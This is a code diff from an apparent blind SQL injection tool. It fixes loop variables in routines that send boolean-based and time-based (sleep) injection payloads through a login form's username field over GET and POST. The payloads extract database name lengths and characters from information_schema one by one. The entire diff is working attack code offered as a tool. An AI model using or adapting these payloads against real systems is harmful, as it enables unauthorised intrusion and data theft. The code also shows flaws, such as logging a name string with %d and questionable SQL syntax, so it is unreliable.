@@ -74,7 +74,7 @@ class SqliDatabases(SqliTest):
                         payload = "username=admi' or select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA WHERE table_schema = " + self.database + " limit " + repr(
                             i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                         if self.Data.GetBuildData(payload, self.len) == 0:
-                            databases_name_len = i
+                            databases_name_len = j
                             break
 
                     logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
@@ -87,7 +87,7 @@ class SqliDatabases(SqliTest):
                                 j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                 i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                             if self.Data.GetBuildData(payload, self.len) == 0:
-                                databases_name += chr(int(j))
+                                databases_name += chr(int(k))
                                 break
 
                     logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)
@@ -119,7 +119,7 @@ class SqliDatabases(SqliTest):
                             i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                         if self.Data.GetTimeData(payload, self.time) == 0:
-                            databases_name_len = i
+                            databases_name_len = j
                             break
 
                     logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
@@ -133,7 +133,7 @@ class SqliDatabases(SqliTest):
                                 i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
 
                             if self.Data.GetTimeData(payload, self.time) == 0:
-                                databases_name += chr(int(j))
+                                databases_name += chr(int(k))
                                 break
 
                     logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)
@@ -205,7 +205,7 @@ class SqliDatabases(SqliTest):
                             "username": "admi' or select ((SELECT length(SCHEMA_NAME) from information_schema.SCHEMATA limit " + repr(
                                 i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                         if self.Data.PostBuildData(payload, self.len) == 0:
-                            databases_name_len = i
+                            databases_name_len = j
                             break
 
                     logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
@@ -218,7 +218,7 @@ class SqliDatabases(SqliTest):
                                 j + 1) + ",1)) from information_schema.SCHEMATA limit " + repr(
                                 i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                             if self.Data.PostBuildData(payload, self.len) == 0:
-                                databases_name += chr(int(j))
+                                databases_name += chr(int(k))
                                 break
 
                     logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)
@@ -252,7 +252,7 @@ class SqliDatabases(SqliTest):
                                 i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                         if self.Data.PostTimeData(payload, self.time) == 0:
-                            databases_name_len = i
+                            databases_name_len = j
                             break
 
                     logger.info("Databases name length sqli success...The databases_name_len is %d..." % databases_name_len)
@@ -266,7 +266,7 @@ class SqliDatabases(SqliTest):
                                 i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
 
                             if self.Data.PostTimeData(payload, self.time) == 0:
-                                databases_name += chr(int(j))
+                                databases_name += chr(int(k))
                                 break
 
                     logger.info("Databases name sqli success...The databases_name is %d..." % databases_name)
